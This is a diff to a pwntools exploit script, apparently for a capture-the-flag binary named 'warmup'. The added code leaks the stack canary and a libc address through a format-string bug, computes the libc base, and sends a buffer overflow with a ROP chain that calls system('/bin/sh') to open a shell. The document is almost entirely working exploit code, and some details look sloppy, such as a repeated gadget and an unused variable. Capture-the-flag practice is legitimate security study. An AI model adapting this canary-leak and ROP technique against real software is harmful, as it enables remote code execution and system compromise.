@@ -41,6 +41,43 @@ Use for leak the following order:
 # Import Libarries
 from pwn import *
 
+# Variables
+padding=b'a'*72     # truley 80, last 8 bytes are the canary so
+padOverBP=b'c'*8    # Overwrite base pointer
+leakAddrStr=b"%18$p %23$p"
+
+# Starting ELF
+elf = ELF("./libc.so.6",checksec=False)
+
+# start process and recieve leaked information
+p = process("./warmup")
+p.recv()
+p.sendline(leakAddrStr)     # Send to leak address
+leak = p.recvuntil(b" ")    # should be leak addr
+leakInt = int(leak,16)      # should be address of stdout
+canary = p.recvuntil(b"\n") # should be canary val
+canaryInt = int(canary,16)
+
+print("leak:", leak)
+print("canary:", canary)
+
+# Find offset to beginning of libc
+libcStart = leakInt - elf.sym.stdout + 200
+print("libc Start:",hex(libcStart))
+elf.address = libcStart
+
+# Other gadgets like ret and shell
+system = elf.symbols['system']
+bin_sh = next(elf.search(b'/bin/sh'))
+pop_rdi_ret = elf.address + 0x0000000000023b72 # 0x0000000000023b72 was his mine is same; found via ROPgadget --binary libc.so.6
+pop_rdi_ret2 = elf.address + 0x0000000000023b73 # 0x0000000000023b72 was his mine is same; found via ROPgadget --binary libc.so.6
+
+# Creating payload
+payload=padding+p64(canaryInt)+padOverBP+p64(pop_rdi_ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(elf.sym.exit)
+
+p.sendline(payload)
+p.interactive()
+'''
 # Get offset to set libc
 getToVbuff = -253      #offset at %19$p to ge to vbuff
 setvbuffOffset = "0x2f8d0"
@@ -82,3 +119,4 @@ payload = padding + canaryInt + padOverBP + popRdiRet + binsh + b'aaaaaaaa' + re
 # send and find flag
 p.sendline(payload)
 p.interactive()
+'''
